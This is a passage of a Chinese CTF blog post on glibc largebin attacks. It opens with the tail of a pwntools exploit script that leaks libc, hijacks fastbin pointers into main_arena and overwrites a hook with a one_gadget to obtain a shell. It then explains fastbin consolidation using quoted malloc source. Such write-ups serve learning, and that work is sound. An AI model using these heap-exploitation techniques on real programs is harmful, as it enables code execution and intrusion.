class="number">-0x10</span>)</span><br><span class="line">chunk1 += p64(victim_addr)</span><br><span class="line">chunk1 += p64(chunk2_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x2</span>, chunk1) <span class="comment"># chunk1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x7</span>, <span class="string">'7'</span>*<span class="number">0x198</span>+p64(<span class="number">0x410</span>)+p64(<span class="number">0x411</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x6</span>)</span><br><span class="line">dele(<span class="number">0x3</span>)</span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'3'</span>*<span class="number">0x30</span>+p64(<span class="number">0xdeadbeefdeadbeef</span>)) <span class="comment"># 此时取出我们要攻击的处于largebin中的chunk，触发largebin attack，因为bk_nextsize指针已经被劫持，我们会申请到已经构造，布置好的fake chunk的位置，达到了任意地址申请的目的。</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0x3</span>)<span class="comment"># 3是我们用largebin attack申请到的chunk，大小伪造成0x410，puts的时候打印出了正常的下一chunk的main_arena+200</span></span><br><span class="line">io.recvuntil(<span class="string">'3'</span>*<span class="number">0x30</span>)</span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">LIBC = u64(io.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3c4be8</span></span><br><span class="line">log.info(<span class="string">"libc base 0x%016x"</span> % LIBC)</span><br><span class="line"></span><br><span class="line">junk = flat(</span><br><span class="line">    <span class="string">'\x03'</span>*<span class="number">0x30</span>,        <span class="comment"># 填充到之前由于防止00截断而被我们劫持的size</span></span><br><span class="line">    p64(<span class="number">0x81</span>),          <span class="comment"># 恢复0x81的size</span></span><br><span class="line">    p64(LIBC+<span class="number">0x3c4be8</span>), <span class="comment"># main_arena+200，恢复smallbin的fd指针</span></span><br><span class="line">    p64(HEAP+<span class="number">0x300</span>),    <span class="comment"># 恢复smallbin中chunk的bk指针</span></span><br><span class="line">)</span><br><span class="line">junk = junk.ljust(<span class="number">0xa8</span>,<span class="string">'A'</span>)</span><br><span class="line">junk += p64(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += junk</span><br><span class="line">recovery += p64(<span class="number">0x80</span>) <span class="comment"># 0x4-&gt;size</span></span><br><span class="line">recovery += p64(<span class="number">0x60</span>) <span class="comment"># 0x4-&gt;fd</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x5</span>)</span><br><span class="line">dele(<span class="number">0x4</span>)</span><br><span class="line">edit(<span class="number">0x3</span>, recovery) <span class="comment"># # 恢复chunk结构</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'4'</span>*<span class="number">0x60</span> ) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += junk</span><br><span class="line">recovery += p64(<span class="number">0x70</span>) <span class="comment"># 0x4-&gt;size</span></span><br><span class="line">recovery += p64(<span class="number">0x0</span>) <span class="comment"># 0x4-&gt;fd</span></span><br><span class="line">edit(<span class="number">0x3</span>, recovery) <span class="comment"># victim, start from HEAP+0x158</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,  <span class="string">'5'</span>*<span class="number">0x30</span> ) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x5</span>)</span><br><span class="line"></span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += <span class="string">'3'</span>*<span class="number">0x30</span></span><br><span class="line">recovery += p64(<span class="number">0x61</span>)</span><br><span class="line">recovery += p64(LIBC+<span class="number">0x3c4b50</span>)<span class="comment"># 劫持处于fastbin中的chunk的fd指针指向main_arena</span></span><br><span class="line">edit(<span class="number">0x3</span>, recovery) </span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">0x40</span>,  <span class="string">'5'</span>*<span class="number">0x30</span> ) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,  p64(LIBC+<span class="number">0x3c5c50</span>)) <span class="comment"># 申请到main_arena,劫持unsortedbin中的top chunk指向main arena</span></span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># recovery</span></span><br><span class="line">edit(<span class="number">0xb</span>, p64(HEAP+<span class="number">0x7e0</span>))</span><br><span class="line">dele(<span class="number">0x6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>*<span class="number">0x1d0</span>+p64(LIBC+<span class="number">0x4527a</span>)) <span class="comment"># </span></span><br><span class="line">pause()</span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="番外篇——关于fastbin的合并"><a href="#番外篇——关于fastbin的合并" class="headerlink" title="番外篇——关于fastbin的合并"></a>番外篇——关于fastbin的合并</h1><h2 id="合并时机"><a href="#合并时机" class="headerlink" title="合并时机"></a>合并时机</h2><h3 id="在申请large-chunk时"><a href="#在申请large-chunk时" class="headerlink" title="在申请large chunk时"></a>在申请large chunk时</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))		<span class="comment">//判断要申请的是否在smallbin范围</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">              &#123;</span><br><span class="line">                errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">              &#125;</span><br><span class="line">            set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">              victim-&gt;<span class="built_in">size</span> |= NON_MAIN_ARENA;</span><br><span class="line">            check_malloced_chunk (av, victim, nb);</span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>			<span class="comment">//不在smallbin而在largebin范围时</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">      malloc_consolidate (av);<span class="comment">//合并</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>一般结束后会放到smallbin中</p>
<h3 id="当申请的chunk需要申请新的top-chunk时"><a href="#当申请的chunk需要申请新的top-chunk时" class="headerlink" title="当申请的chunk需要申请新的top chunk时"></a>当申请的chunk需要申请新的top chunk时</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"> </span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      <span class="built_in">size</span> = chunksize (victim);</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))	<span class="comment">//top chunk是否满足我们下一次分配的需求？</span></span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = <span class="built_in">size</span> - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"> </span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))<span class="comment">//判断是否有fastbin的存在，如果存在fastbin，那么则进行合并</span></span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))<span class="comment">//匹配我们需要的大小nb在smallbin中或者largebin中是否有对应的</span></span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span><span class="comment">//如果都不匹配or不存在 fastbin，则扩展top chunk。</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<h3 id="free的堆块大小大于fastbin中的最大size。（注意这里并不是指当前fastbin中最大chunk的size，而是指fastbin中所定义的最大chunk的size，是一个固定值。）"><a href="#free的堆块大小大于fastbin中的最大size。（注意这里并不是指当前fastbin中最大chunk的size，而是指fastbin中所定义的最大chunk的size，是一个固定值。）" class="headerlink" title="free的堆块大小大于fastbin中的最大size。（注意这里并不是指当前fastbin中最大chunk的size，而是指fastbin中所定义的最大chunk的size，是一个固定值。）"></a>free的堆块大小大于fastbin中的最大size。（注意这里并不是指当前fastbin中最大chunk的size，而是指fastbin中所定义的最大chunk的size，是一个固定值。）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(<span class="built_in">size</span>) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">  <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);</span><br></pre></td></tr></table></figure>

<h2 id="合并过程"><a href="#合并过程" class="headerlink" title="合并过程"></a>合并过程</h2><h3 id="malloc-consolidate既可以作为fastbin的初始化函数，也可以作为fastbin的合并函数。"><a href="#malloc-consolidate既可以作为fastbin的初始化函数，也可以作为fastbin的合并函数。" class="headerlink" title="malloc_consolidate既可以作为fastbin的初始化函数，也可以作为fastbin的合并函数。"></a>malloc_consolidate既可以作为fastbin的初始化函数，也可以作为fastbin的合并函数。</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T <span class="built_in">size</span>;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn't</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;	<span class="comment">//max_fast为fastbin的最大大小</span></span><br><span class="line">    (av);</span><br><span class="line"> </span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"> </span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;		<span class="comment">//这是一个大循环，循环遍历fastbin中的chunk</span></span><br><span class="line">      check_inuse_chunk(av, p);</span><br><span class="line">      nextp = p-&gt;fd;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">      <span class="built_in">size</span> = p-&gt;<span class="built_in">size</span> &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">      nextchunk = chunk_at_offset(p, <span class="built_in">size</span>);</span><br><span class="line">      nextsize = chunksize(nextchunk);</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (!prev_inuse(p)) &#123;	<span class="comment">//当pre in use位为0，即物理相邻的上一块是free状态，合并</span></span><br><span class="line">        prevsize = p-&gt;prev_size;</span><br><span class="line">        <span class="built_in">size</span> += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">        unlink(av, p, bck, fwd);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//物理相邻的下一个chunk为free状态，合并</span></span><br><span class="line">          <span class="built_in">size</span> += nextsize;</span><br><span class="line">          unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">          clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">        first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">        unsorted_bin-&gt;fd = p;</span><br><span class="line">        first_unsorted-&gt;bk = p;<span class="comment">//直接插入unsortedbin的头部</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (<span class="built_in">size</span>)) &#123;</span><br><span class="line">          p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        set_head(p, <span class="built_in">size</span> | PREV_INUSE);</span><br><span class="line">        p-&gt;bk = unsorted_bin;</span><br><span class="line">        p-&gt;fd = first_unsorted;</span><br><span class="line">        set_foot(p, <span class="built_in">size</span>);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">size</span> += nextsize;</span><br><span class="line">        set_head(p, <span class="built_in">size</span> | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">    &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1、首先将与该块相邻的下一块的PREV_INUSE置为1。<br>2、如果相邻的上一块为free，则合并，再判断相邻的下一块是否free，若free，则合并。<br>3、<strong>不管是否完成合并，都会把fastbin或者完成合并以后的bin放到unsortbin中。</strong>（如果与top chunk相邻，则合并到top chunk中）这点尤其要注意，这也是为什么可以泄漏出libc基地址的原因。<strong>（注意，这里代表，即使没有发生合并，也会将对应的fastbin的chunk放入unosrtedbin，比如我们有一个0x60、一个0x80、他们物理上不相邻，但都处于free状态，那么合并时他们俩都会被放入unsortedbin。）</strong></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.jianshu.com/p/d3fdeff8683f" target="_blank" rel="noopener">https://www.jianshu.com/p/d3fdeff8683f</a></p>
<p><a href="https://wiki.x10sec.org/pwn/heap/heap_implementation_details/#large-bin" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/heap/heap_implementation_details/#large-bin</a></p>
<p><a href="https://xz.aliyun.com/t/5177?accounttraceid=a5c0b873d40e445f90a2b0a7e8cde4a4fkam" target="_blank" rel="noopener">https://xz.aliyun.com/t/5177?accounttraceid=a5c0b873d40e445f90a2b0a7e8cde4a4fkam</a></p>
<p><a href="https://bbs.pediy.com/thread-257742.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257742.htm</a></p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Paxos</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/08/31/Largebin-attack%E6%80%BB%E7%BB%93/">http://yoursite.com/2020/08/31/Largebin-attack%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/largebin/">largebin</a></div><div class="post_share"><div class="social-share" data-image="https://s1.ax1x.com/2020/08/14/di8hDO.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> Donate<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="post-qr-code__img" src="/img/wechat.jpg" alt="微信"/><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="post-qr-code__img" src="/img/alipay.jpg" alt="支付寶"/><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2020/09/02/bctf2018-baby-arena%EF%BC%88FSOP-global-max-fast%EF%BC%89/"><img class="prev_cover" src="https://orangegzy.github.io/img/8xeljo.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">bctf2018_baby_arena（FSOP+global_max_fast）</div></div></a></div><div class="next-post pull_right"><a href="/2020/08/21/ciscnCTF2020-pwn/"><img class="next_cover" src="https://s1.ax1x.com/2020/08/21/dtK6uq.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">ciscnCTF2020-pwn</div></div></a></div></nav><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> Comment</span></div><div id="disqus_thread"></div><script>var disqus_config = function () {
  this.page.url = 'http://yoursite.com/2020/08/31/Largebin-attack%E6%80%BB%E7%BB%93/';
  this.page.identifier = '2020/08/31/Largebin-attack总结/';
  this.page.title = 'Largebin-attack总结';
};
(function() { 
  var d = document, s = d.createElement('script');
  s.src = 'https://ScUpax0s.disqus.com/embed.js';
  s.setAttribute('data-timestamp', +new Date());
  (d.head || d.body).appendChild(s);
})();
</script><script>function getDisqusCount() {
  var d = document, s = d.createElement('script');
  s.src = 'https://ScUpax0s.disqus.com/count.js';
  s.id = 'dsq-count-scr';
  (d.head || d.body).appendChild(s);
}

window.addEventListener('load', getDisqusCount, false);</script></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By Paxos</div><div class="framework-info"><span>Driven </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="Read Mode"></i><i class="fa fa-plus" id="font_plus" title="Increase font size"></i><i class="fa fa-minus" id="font_minus" title="Decrease font size"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="Traditional Chinese and Simplified Chinese Conversion" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="Dark Mode"></i></div><div id="rightside-config-show"><div id="rightside_config" title="Setting"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="Scroll to comment"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="Table of Contents" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="Back to top" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@3/instantpage.min.js" type="module"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>